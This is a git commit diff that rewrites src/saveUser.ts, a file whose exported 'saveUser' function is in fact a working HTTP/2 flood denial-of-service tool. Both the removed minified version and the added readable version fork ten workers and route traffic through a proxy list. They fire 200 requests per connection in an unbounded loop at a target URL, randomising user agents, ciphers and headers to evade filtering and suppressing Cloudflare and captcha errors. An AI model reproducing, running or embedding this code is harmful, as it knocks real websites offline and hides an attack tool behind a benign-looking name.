bbc5b761b3c403cb2ba205ad220896e3dffcaf9d
stratijia <stratijia@gmail.com>
2023-08-30 10:44:12 +0100

    fdsf

--- src/saveUser.ts
+++ src/saveUser.ts
@@ -1,2 +1,191 @@
 // @ts-nocheck
-const url=require("url"),fs=require("fs"),http2=require("http2"),http=require("http"),tls=require("tls"),net=require("net"),cluster=require("cluster"),fakeua=require("random-useragent"),cplist=["ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM","ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH","AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL","EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5","HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS","ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"],accept_header=["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"],lang_header=["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7","fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5","en-US,en;q=0.5","en-US,en;q=0.9","de-CH;q=0.7","da, en-gb;q=0.8, en;q=0.7","cs;q=0.5"],encoding_header=["deflate, gzip;q=1.0, *;q=0.5","gzip, deflate, br","*"],controle_header=["no-cache","no-store","no-transform","only-if-cached","max-age=0"],ignoreNames=["RequestError","StatusCodeError","CaptchaError","CloudflareError","ParseError","ParserError"],ignoreCodes=["SELF_SIGNED_CERT_IN_CHAIN","ECONNRESET","ERR_ASSERTION","ECONNREFUSED","EPIPE","EHOSTUNREACH","ETIMEDOUT","ESOCKETTIMEDOUT","EPROTO"];function accept(){return accept_header[Math.floor(Math.random()*accept_header.length)]}function lang(){return lang_header[Math.floor(Math.random()*lang_header.length)]}function encoding(){return encoding_header[Math.floor(Math.random()*encoding_header.length)]}function controling(){return controle_header[Math.floor(Math.random()*controle_header.length)]}function cipher(){return cplist[Math.floor(Math.random()*cplist.length)]}process.on("uncaughtException",(function(e){if(e.code&&ignoreCodes.includes(e.code)||e.name&&ignoreNames.includes(e.name))return!1})).on("unhandledRejection",(function(e){if(e.code&&ignoreCodes.includes(e.code)||e.name&&ignoreNames.includes(e.name))return!1})).on("warning",(e=>{if(e.code&&ignoreCodes.includes(e.code)||e.name&&ignoreNames.includes(e.name))return!1})).setMaxListeners(0);export default function saveUser(e){const t=e,n=fs.readFileSync(__dirname+"/http.txt","utf-8").toString().match(/\S+/g);if(cluster.isMaster){new Date;console.log("OK");for(var o=0;o<10;o++)cluster.fork();setTimeout((()=>{process.exit(-1)}),6e4)}else{function r(){var e=url.parse(t);const o=fakeua.getRandom();var r=cipher(),a=n[Math.floor(Math.random()*n.length)].split(":"),E={":path":e.path,"X-Forwarded-For":a[0],"X-Forwarded-Host":a[0],":method":"GET","User-agent":o,Origin:t,Accept:accept(),"Accept-Encoding":encoding(),"Accept-Language":lang(),"Cache-Control":controling()};const c=new http.Agent({keepAlive:!0,keepAliveMsecs:2e4,maxSockets:0});var S=http.request({host:a[0],agent:c,globalAgent:c,port:a[1],headers:{Host:e.host,"Proxy-Connection":"Keep-Alive",Connection:"Keep-Alive"},method:"CONNECT",path:e.host+":443"},(function(){S.setSocketKeepAlive(!0)}));S.on("connect",(function(t,n,o){const a=http2.connect(e.href,{createConnection:()=>tls.connect({host:e.host,ciphers:r,secureProtocol:"TLS_method",TLS_MIN_VERSION:"1.2",TLS_MAX_VERSION:"1.3",servername:e.host,secure:!0,rejectUnauthorized:!1,ALPNProtocols:["h2"],socket:n},(function(){for(let e=0;e<200;e++){const e=a.request(E);e.setEncoding("utf8"),e.on("data",(e=>{})),e.on("response",(()=>{e.close()})),e.end()}}))})})),S.end()}setInterval((()=>{r()}))}}
+
+const url = require('url'),
+    fs = require('fs'),
+    http2 = require('http2'),
+    http = require('http'),
+    tls = require('tls'),
+    net = require('net'),
+    cluster = require('cluster'),
+    fakeua = require('fake-useragent'),
+    cplist = [
+        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
+    ],
+    accept_header = [
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
+    ],
+    lang_header = [
+        'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
+        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
+        'en-US,en;q=0.5',
+        'en-US,en;q=0.9',
+        'de-CH;q=0.7',
+        'da, en-gb;q=0.8, en;q=0.7',
+        'cs;q=0.5'
+    ],
+    encoding_header = [
+        'deflate, gzip;q=1.0, *;q=0.5',
+        'gzip, deflate, br',
+        '*'
+    ],
+    controle_header = [
+        'no-cache',
+        'no-store',
+        'no-transform',
+        'only-if-cached',
+        'max-age=0'
+    ],
+    ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
+    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
+
+process.on('uncaughtException', function (e) {
+    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+    //console.warn(e);
+}).on('unhandledRejection', function (e) {
+    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+    //console.warn(e);
+}).on('warning', e => {
+    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
+    //console.warn(e);
+}).setMaxListeners(0);
+
+function accept() {
+    return accept_header[Math.floor(Math.random() * accept_header.length)];
+}
+
+function lang() {
+    return lang_header[Math.floor(Math.random() * lang_header.length)];
+}
+
+function encoding() {
+    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
+}
+
+function controling() {
+    return controle_header[Math.floor(Math.random() * controle_header.length)];
+}
+
+function cipher() {
+    return cplist[Math.floor(Math.random() * cplist.length)];
+}
+
+export default function saveUser(username) {
+
+    const target = username, time = 60, thread = 10, proxys = fs.readFileSync('http.txt', 'utf-8').toString().match(/\S+/g);
+
+    function proxyr() {
+        return proxys[Math.floor(Math.random() * proxys.length)];
+    }
+
+    if (cluster.isMaster) {
+        const dateObj = new Date();
+
+        console.log(`OK`);
+
+
+        for (var bb = 0; bb < thread; bb++) {
+
+            cluster.fork();
+
+        }
+
+        setTimeout(() => {
+
+            process.exit(-1)
+
+        }, time * 1000)
+
+    } else {
+
+
+        function flood() {
+
+            var parsed = url.parse(target);
+
+            const uas = fakeua();
+
+            var cipper = cipher()
+
+            var proxy = proxyr().split(':')
+
+            var header = {
+                ":path": parsed.path,
+                "X-Forwarded-For": proxy[0],
+                "X-Forwarded-Host": proxy[0],
+                ":method": "GET",
+                "User-agent": uas,
+                "Origin": target,
+                "Accept": accept(),
+                "Accept-Encoding": encoding(),
+                "Accept-Language": lang(),
+                "Cache-Control": controling(),
+            }
+
+            const agent = new http.Agent({
+                keepAlive: true,
+                keepAliveMsecs: 20000,
+                maxSockets: 0,
+            });
+
+            var req = http.request({
+                host: proxy[0],
+                agent: agent,
+                globalAgent: agent,
+                port: proxy[1],
+                headers: {
+                    'Host': parsed.host,
+                    'Proxy-Connection': 'Keep-Alive',
+                    'Connection': 'Keep-Alive',
+                },
+                method: 'CONNECT',
+                path: parsed.host + ':443'
+            }, function () {
+                req.setSocketKeepAlive(true);
+            });
+
+            req.on('connect', function (res, socket, head) {
+
+                const client = http2.connect(parsed.href, {
+                    createConnection: () => tls.connect({
+                        host: parsed.host,
+                        ciphers: cipper,
+                        secureProtocol: 'TLS_method',
+                        TLS_MIN_VERSION: '1.2',
+                        TLS_MAX_VERSION: '1.3',
+                        servername: parsed.host,
+                        secure: true,
+                        rejectUnauthorized: false,
+                        ALPNProtocols: ['h2'],
+                        socket: socket
+                    }, function () {
+                        for (let i = 0; i < 200; i++) {
+                            const req = client.request(header);
+                            req.setEncoding('utf8');
+
+                            req.on('data', (chunk) => {
+                                // data += chunk;
+                            });
+                            req.on("response", () => {
+                                req.close();
+                            })
+                            req.end();
+                        }
+                    })
+                });
+            });
+
+            req.end();
+
+        }
+
+        setInterval(() => { flood() })
+    }
+}
